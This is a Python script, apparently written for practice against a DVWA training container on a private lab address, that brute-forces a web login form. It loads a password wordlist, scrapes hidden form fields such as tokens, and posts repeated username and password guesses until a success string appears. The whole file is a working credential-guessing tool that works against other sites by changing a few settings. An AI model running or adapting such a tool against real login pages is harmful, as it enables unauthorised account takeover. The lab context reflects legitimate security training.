import requests
import threading
import sys
import queue

from html.parser import HTMLParser

# General settings
verbose = True
user_thread = 10
username = 'admin'
wordlist_file = '/usr/share/wordlists/fasttrack.txt'
resume = None

# Target specific settings changed to target DVWA docker container running in Virtualbox
target = 'http://172.28.128.3/login.php'
post = target

username_field = 'username'
password_field = 'password'

success_check = 'Welcome'


def vprint(verbose_string, lverbose=False):
    global verbose
    if lverbose or verbose:
        if lverbose is False:
            icon = '*'
        else:
            icon = lverbose
        print('[{}] {}'.format(icon, verbose_string))


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == 'name':
                    tag_name = value
                if name == 'value':
                    tag_value = value

            if tag_name is not None:
                self.tag_results[tag_name] = value


class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.pass_queue = words
        self.found = False

        print('Finished setting up for: {}'.format(username))

    def run_bruteforce(self):
        t = threading.Thread(target=self.web_bruter)
        t.start()

    def web_bruter(self):
        with requests.Session() as brute_session:
            while not self.pass_queue.empty() and not self.found:
                brute = self.pass_queue.get()
                login_form = brute_session.get(target)
                login_cookies = login_form.cookies

                print('Trying: {} : {} ({} left)'.format(
                    self.username,
                    brute,
                    self.pass_queue.qsize()))

                # Parse out hidden fields
                parser = BruteParser()
                parser.feed(login_form.text)

                post_tags = parser.tag_results

                # Update next attempt inputs with our username and password
                attempt = {
                    'username': self.username,
                    'password': brute,
                    'Login':'Login'}
                full_attempt = {**post_tags, **attempt}

                login_response = brute_session.post(
                    post,
                    data=full_attempt,
                    cookies=login_cookies)

                if success_check in login_response.text:
                    self.found = True
                    vprint('Brute force successful.')
                    vprint('Username: {}'.format(username))
                    vprint('Pass: {}'.format(brute))
                    vprint('Waiting for other threads to exit...')


def build_wordlist(wordlist_file):
    with open(wordlist_file, 'rb') as fd:
        raw_words = fd.readlines()

    found_resume = False
    words = queue.Queue()

    for word in raw_words:
        # ignore lines that start with a '#'
        if 35 == word[0]:
            continue
        word = word.decode().rstrip()

        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print('Resuming from: {}'.format(resume))
        else:
            words.put(word)
    # words.put('password')
    return words


words = build_wordlist(wordlist_file)

bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()